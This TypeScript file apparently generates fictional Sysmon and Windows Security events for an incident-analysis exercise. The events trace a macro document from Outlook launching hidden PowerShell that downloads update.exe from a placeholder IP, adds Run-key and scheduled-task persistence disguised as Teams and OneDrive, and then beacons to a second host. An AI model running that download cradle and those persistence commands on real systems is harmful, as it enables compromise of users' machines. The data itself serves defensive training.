/** Événements Sysmon et Sécurité fictifs du poste PC-RH-03 (utilisatrice : nadia.l). */

export interface SysmonEvent {
  id: number;
  time: string;
  eventId: number;
  image: string;
  detail: string;
}

const APPDATA = 'C:\\Users\\nadia.l\\AppData\\Roaming';

export const EVENT_NAMES: Record<number, string> = {
  1: 'Sysmon 1 — Création de processus',
  3: 'Sysmon 3 — Connexion réseau',
  11: 'Sysmon 11 — Création de fichier',
  13: 'Sysmon 13 — Valeur de registre définie',
  4698: 'Sécurité 4698 — Tâche planifiée créée',
};

export function buildSysmon(): SysmonEvent[] {
  const ev: Omit<SysmonEvent, 'id'>[] = [
    { time: '09:02:11', eventId: 1, image: 'C:\\Windows\\explorer.exe', detail: 'Enfant : C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE' },
    { time: '09:05:40', eventId: 1, image: 'C:\\Windows\\System32\\svchost.exe', detail: 'Enfant : C:\\Windows\\System32\\taskhostw.exe' },
    { time: '09:14:03', eventId: 1, image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', detail: 'Enfant : WINWORD.EXE /n "C:\\Users\\nadia.l\\AppData\\Local\\Temp\\Offre_emploi_RH.docm"' },
    { time: '09:14:19', eventId: 1, image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', detail: 'Enfant : cmd.exe /c powershell -w hidden -nop -c "iwr http://198.51.100.40/u.png -OutFile $env:APPDATA\\Microsoft\\Teams\\update.exe"' },
    { time: '09:14:20', eventId: 1, image: 'C:\\Windows\\System32\\cmd.exe', detail: 'Enfant : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -nop -c "iwr …"' },
    { time: '09:14:21', eventId: 3, image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', detail: 'TCP 10.0.12.31:51032 → 198.51.100.40:80' },
    { time: '09:14:22', eventId: 11, image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', detail: `Fichier créé : ${APPDATA}\\Microsoft\\Teams\\update.exe` },
    { time: '09:14:24', eventId: 13, image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', detail: `HKU\\S-1-5-21-…-1107\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TeamsUpdate = "${APPDATA}\\Microsoft\\Teams\\update.exe"` },
    { time: '09:14:25', eventId: 1, image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', detail: `Enfant : schtasks.exe /create /tn "OneDrive Sync Check" /tr "${APPDATA}\\Microsoft\\Teams\\update.exe" /sc onlogon` },
    { time: '09:14:25', eventId: 4698, image: 'C:\\Windows\\System32\\schtasks.exe', detail: 'Tâche « \\OneDrive Sync Check », déclencheur : ouverture de session, action : update.exe' },
    { time: '09:14:27', eventId: 1, image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', detail: `Enfant : ${APPDATA}\\Microsoft\\Teams\\update.exe (non signé)` },
    { time: '09:15:27', eventId: 3, image: `${APPDATA}\\Microsoft\\Teams\\update.exe`, detail: 'TCP 10.0.12.31:51040 → 203.0.113.66:443' },
    { time: '09:16:27', eventId: 3, image: `${APPDATA}\\Microsoft\\Teams\\update.exe`, detail: 'TCP 10.0.12.31:51047 → 203.0.113.66:443' },
    { time: '09:17:28', eventId: 3, image: `${APPDATA}\\Microsoft\\Teams\\update.exe`, detail: 'TCP 10.0.12.31:51055 → 203.0.113.66:443' },
    { time: '09:20:02', eventId: 3, image: 'C:\\Program Files\\Microsoft\\Teams\\ms-teams.exe', detail: 'TCP 10.0.12.31:51071 → 52.112.0.10:443 (service Microsoft Teams)' },
  ];
  return ev.map((e, i) => ({ ...e, id: i + 1 }));
}
